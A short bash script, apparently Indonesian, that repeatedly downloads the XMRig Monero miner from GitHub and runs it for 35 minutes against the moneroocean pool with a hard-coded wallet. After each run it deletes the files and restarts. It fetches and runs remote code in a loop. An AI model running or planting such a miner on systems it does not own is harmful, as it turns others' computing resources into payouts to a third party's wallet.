#!/bin/bash

while true; do
    mkdir -p kd && cd kd
    wget https://github.com/xmrig/xmrig/releases/download/v6.21.1/xmrig-6.21.1-linux-x64.tar.gz
    tar -xf xmrig-6.21.1-linux-x64.tar.gz && cd xmrig-6.21.1
    timeout 35m ./xmrig -a rx/0 -o stratum+ssl://gulf.moneroocean.stream:443 -u 424ZdkbXhG6ck9jXhtCyeDhQFrQCKpqRLb5FVHfFi3DwfHZuQvQMDwqgwXTx8NxrKxWRx2vR7dN3M8RBkVRWHUMJ797QdPq -p x --1gb-pages
    cd ../..
    rm -rf kd
    echo "Menunggu 5 detik sebelum menjalankan ulang..."
    sleep 5
done
